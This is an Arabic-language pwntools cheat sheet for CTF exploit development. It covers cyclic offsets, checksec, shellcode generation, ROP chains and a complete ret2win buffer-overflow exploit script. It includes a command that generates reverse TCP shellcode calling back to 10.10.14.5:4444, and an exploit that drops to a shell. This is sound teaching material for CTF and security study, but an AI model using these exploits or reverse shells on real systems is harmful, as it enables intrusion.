<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ورقة الغش في pwntools

[pwntools](https://github.com/Gallopsled/pwntools) هو إطار عمل CTF الأفضل في فئته ومكتبة تطوير استغلالية مكتوبة بلغة Python. تم تصميمه للنماذج الأولية السريعة والاستغلال الثنائي (pwn) والهندسة العكسية، وهو يوفر مجموعة شاملة من أدوات سطر الأوامر (`pwn cyclic` و`pwn checksec` و`pwn asm` و`pwn shellcraft`) إلى جانب واجهة برمجة تطبيقات Python عالية المستوى للتفاعل مع العمليات المحلية والمقابس البعيدة.

---

## جدول المحتويات

- [القدرات الأساسية](#القدرات الأساسية)
- [التثبيت](#التثبيت)
- [أدوات سطر الأوامر (`pwn <cmd>`)](#command-line-utilities-pwn-cmd)
  - [`pwn cyclic` (حساب إزاحة المخزن المؤقت)](#pwn-cyclic-buffer-offset-calculation)
  - [`pwn checksec` (فحص التخفيف)](#pwn-checksec-mitigation-inspection)
  - [`pwn asm` & `pwn disasm` (المجمع / المفكك)](#pwn-asm--pwn-disasm-assembler--disassembler)
  - [`pwn shellcraft` (مولد كود القشرة)](#pwn-shellcraft-shellcode-generator)
  - [`pwn template` (استغلال مولد الهيكل العظمي)](#pwn-template-exploit-skeleton-generator)
- [سير عمل تطوير برمجيات بايثون](#python-exploit-development-workflow)
  - [اتصالات العملية والمقبس البعيد](#process--remote-socket-connections)
  - [تحليل ELF والرموز](#elf-parsing--symbols)
  - [بناء سلسلة ROP](#rop-chain-construction)
  - [التعبئة والانتهاء (`p32` / `p64`)](#packing--endianness-p32--p64)
- [مثال كامل لبرمجيات إكسبلويت (Buffer Overflow + ret2win)](#Complete-exploit-example-buffer-overflow--ret2win)

---

## القدرات الأساسية

- **هندسة الأنابيب:** واجهة موحدة للتفاعل مع العمليات المحلية (`process`)، ومآخذ TCP عن بعد (`remote`)، وجلسات SSH (`ssh`).
- **الفحص الثنائي والأداة:** دقة رمز ELF الآلية، والبحث عن GOT/PLT، والتوليف الآلي لسلسلة ROP.
- **التجميع الفوري:** ترجمة فورية بين أساليب تقوية التجميع وأكواد التشغيل عبر x86 وx86_64 وARM وMIPS وAArch64.
- **تركيب كود القشرة:** قوالب كود القشرة المعدة مسبقًا والقابلة للتخصيص للأصداف العكسية والتنفيذ وقراءة الملفات والتهرب.

---

## تثبيت
```bash
# Ubuntu / Debian / Kali Linux
sudo apt-get update && sudo apt-get install -y python3-pwntools

# Via pip in an isolated Python environment
pip3 install pwntools

# Verify command-line utilities
pwn version
```
---

## أدوات سطر الأوامر المساعدة (`pwn <cmd>`)

### `pwn cyclic` (حساب إزاحة المخزن المؤقت)
قم بإنشاء أنماط دورية فريدة من نوعها لـ De Bruijn لتحديد إزاحة التعطل الدقيقة (الكتابة فوق EIP / RIP):
```bash
# Generate a 200-byte unique pattern
pwn cyclic 200

# Find offset of crashing pattern (e.g. from crash address or register value 0x6161616c)
pwn cyclic -l 0x6161616c
# Output: 44 (offset is exactly 44 bytes to saved instruction pointer)

# 64-bit architecture cyclic pattern lookup
pwn cyclic -l "faaa" -n 8
```
### `pwn checksec` (فحص التخفيف)
التحقق من إجراءات تخفيف الأمان (Canary، وNX، وPIE، وRELRO، وASLR) لأي ملف ELF قابل للتنفيذ:
```bash
pwn checksec /path/to/binary
```
### `pwn asm` و`pwn disasm` (المجمع/المفكك)
قم بتجميع التعليمات في بايتات كود القشرة مباشرة من المحطة:
```bash
# Assemble x86 instructions to hex bytes
pwn asm "xor eax, eax; push eax"

# Assemble 64-bit shellcode with null-byte output format
pwn asm -c amd64 "mov rax, 59; syscall" --format hex

# Disassemble raw hex bytes back to assembly
pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
```
### `pwn shellcraft` (مولد كود القشرة)
قم بإنشاء حمولات كود القشرة الجاهزة للإنتاج مباشرةً إلى المحطة الطرفية stdout أو الملفات الثنائية:
```bash
# Generate Linux x64 execve /bin/sh shellcode in hex
pwn shellcraft amd64.linux.sh --format hex

# Generate reverse TCP shellcode (IP: 10.10.14.5, Port: 4444)
pwn shellcraft amd64.linux.connect 10.10.14.5 4444

# Output pure raw bytes directly into a file
pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
```
### `pwn template` (استغلال مولد الهيكل العظمي)
قم بإنشاء قالب استغلال Python تم اختباره في المعركة لخادم ثنائي وبعيد مستهدف:
```bash
pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
```
---

## سير عمل تطوير برمجيات إكسبلويت بايثون

### اتصالات العملية والمقبس البعيد
```python
from pwn import *

# Set target architecture and log level
context.arch = 'amd64'
context.log_level = 'debug'

# Local process execution
io = process('./vuln_binary')

# Or connect to remote CTF instance
# io = remote('10.10.10.100', 1337)

# Send and receive data
io.recvuntil(b'Enter your name: ')
io.sendline(b'Alice')

# Switch to interactive shell once exploit succeeds
io.interactive()
```
### تحليل ورموز ELF
قراءة عناوين الوظائف وجداول GOT وPLT تلقائيًا دون إجراء عمليات بحث يدوية عن GDB:
```python
elf = ELF('./vuln_binary')
print(f"Target function address: {hex(elf.symbols['win'])}")
print(f"puts() PLT address: {hex(elf.plt['puts'])}")
print(f"puts() GOT address: {hex(elf.got['puts'])}")
```
### بناء سلسلة ROP
بناء سلاسل البرمجة الموجهة نحو العودة (ROP) تلقائيًا:
```python
elf = ELF('./vuln_binary')
rop = ROP(elf)

# Call win_function(0x1337, 0xdeadbeef)
rop.win(0x1337, 0xdeadbeef)
print(rop.dump())

payload = b"A" * 40 + rop.chain()
```
### التعبئة والانتهاء (`p32` / `p64`)
تحويل عناوين الذاكرة الصحيحة إلى بايتات ذات نهاية صغيرة:
```python
# 32-bit little-endian packing
address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'

# 64-bit little-endian packing
address_64 = p64(0x0000000000401156)

# Unpacking bytes to integer
val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
```
---

## مثال كامل للاستغلال (Buffer Overflow + ret2win)
```python
#!/usr/bin/env python3
from pwn import *

# Binary configuration
binary_path = './challenge'
context.binary = binary_path
context.log_level = 'info'

elf = ELF(binary_path)

# 1. Start target process or remote connection
if args.REMOTE:
    io = remote('target.ctf.local', 9999)
else:
    io = process(binary_path)

# 2. Craft payload
offset = 40
win_address = elf.symbols['win']

# Include ret gadget for 16-byte stack alignment in Ubuntu 64-bit
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]

payload = flat(
    asm('nop') * offset,
    ret_gadget,
    win_address
)

# 3. Deliver payload
io.recvuntil(b'Say something: ')
io.sendline(payload)

# 4. Drop to interactive shell
log.success("Exploit sent! Enjoy your shell:")
io.interactive()
```